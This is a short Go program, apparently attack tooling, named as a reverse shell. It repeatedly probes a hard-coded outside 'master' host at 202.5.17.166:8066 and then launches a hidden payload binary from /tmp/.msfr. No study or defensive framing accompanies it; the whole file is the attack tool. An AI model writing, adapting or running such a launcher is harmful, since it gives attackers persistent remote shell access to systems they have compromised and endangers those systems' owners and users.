package main

import(
    "os/exec"
    "log"
    "net"
    "time"
)

func reverseshell(addr string){

    chk_conn:
    // make sure the master is online
    for{
        c, e := net.Dial("tcp", addr)
        if e != nil {
            time.Sleep(3 * time.Second)
        } else {
            c.Close()
            break
        }
    }

    // now send out our shell
    for{
        msf := exec.Command("/tmp/.msfr")
        err := msf.Start()
        if err != nil {
            log.Fatal(err)
            time.Sleep(3 * time.Second)
        }
        goto chk_conn
    }
}

func main(){
    var master_ip string
    master_ip = "202.5.17.166:8066"
    reverseshell(master_ip)
}
